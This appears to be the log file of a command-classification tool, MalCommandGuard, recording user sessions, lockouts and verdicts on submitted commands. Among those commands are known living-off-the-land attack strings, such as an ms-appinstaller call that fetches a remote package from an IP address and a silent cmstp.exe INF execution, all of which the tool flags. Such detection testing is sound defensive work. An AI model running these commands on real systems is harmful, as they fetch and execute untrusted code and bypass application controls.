+INFO: DETAILED_ANALYSIS | User: admin | Command: http://www.eicar.org/download/eicar.com.txt | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.8500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 06, 2025 1:02:53 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://bit.ly/suspicious-link | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 06, 2025 1:03:03 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://www.microsoft.com | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 08, 2025 11:11:00 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 11:11:46 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 11:12:01 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 08, 2025 11:12:08 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 08, 2025 11:12:17 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 08, 2025 11:12:27 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://www.eicar.org/download/eicar.com.txt | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.8500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 08, 2025 11:12:34 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://bit.ly/suspicious-link | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 08, 2025 11:12:40 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://www.microsoft.com | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 08, 2025 11:21:05 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 08, 2025 11:22:01 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 11:22:12 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:22:20 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:22:32 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:22:32 AM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 08, 2025 11:24:05 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 11:25:24 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 11:25:52 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 08, 2025 11:27:11 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 08, 2025 11:28:05 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 08, 2025 11:28:22 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://www.eicar.org/download/eicar.com.txt | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.8500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 08, 2025 11:34:51 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 08, 2025 11:36:21 AM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: azlina (USER)
+Jul 08, 2025 11:36:30 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 11:37:05 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 08, 2025 11:37:12 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:37:21 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:37:28 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 08, 2025 11:37:28 AM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 08, 2025 11:38:47 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 11:38:56 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 11:41:00 AM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 08, 2025 11:52:52 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 11:54:34 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 11:55:15 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 08, 2025 11:55:53 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 08, 2025 11:58:11 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: 2 | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: powershell | Content: LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF} | Frequency: none | Source: LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF} | Network: 10.10.10.11 | Behavioural: Get-AppLockerPolicy,-Domain,-LDAP | History: none
+Jul 08, 2025 12:05:21 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 08, 2025 12:05:39 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 08, 2025 12:06:56 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.6500 | Lolbin: cmstp.exe | Content: c:\cmstp\CorpVPN.inf | Frequency: none | Source: c:\cmstp\CorpVPN.inf | Network: none | Behavioural: /ni,/s | History: none
+Jul 24, 2025 10:46:11 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 24, 2025 10:46:58 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 24, 2025 10:47:56 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 24, 2025 10:53:12 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 24, 2025 10:53:37 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 24, 2025 10:53:42 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 24, 2025 10:53:52 AM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 24, 2025 10:53:52 AM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 30, 2025 8:04:31 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:12:40 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:14:10 PM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: JSKL (USER)
+Jul 30, 2025 8:22:19 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:22:46 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: JSKL (USER)
+Jul 30, 2025 8:23:21 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 30, 2025 8:23:30 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:24:47 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: JSKL
+Jul 30, 2025 8:25:25 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: JSKL
+Jul 30, 2025 8:25:25 PM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 30, 2025 8:26:12 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:26:35 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 30, 2025 8:27:14 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 30, 2025 8:27:19 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 30, 2025 8:27:32 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: JSKL (USER)
+Jul 31, 2025 12:38:35 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: JSKL
+Jul 31, 2025 12:38:43 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 31, 2025 12:44:22 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 31, 2025 12:49:46 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 31, 2025 12:51:22 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 31, 2025 12:52:43 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://www.microsoft.com | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 31, 2025 12:53:52 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://bit.ly/suspicious-link | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 31, 2025 12:54:54 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://www.eicar.org/download/eicar.com.txt | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.8500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 31, 2025 2:06:33 AM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 31, 2025 2:08:14 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 31, 2025 2:08:17 AM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 31, 2025 9:36:41 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 31, 2025 9:36:49 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 31, 2025 11:36:59 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 31, 2025 11:37:14 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: JSKL (USER)
+Jul 31, 2025 11:37:51 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: JSKL | Command: ifconfig | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: unknown command | Frequency: uncommon | Source: user input | Network: none | Behavioural: new command | History: none
+Jul 31, 2025 11:37:59 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 31, 2025 11:40:32 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Aug 01, 2025 12:43:12 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Aug 01, 2025 12:43:32 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jskl (USER)
+Aug 01, 2025 12:43:38 AM malcommandguard.MalCommandGuard main
+INFO: Application terminated
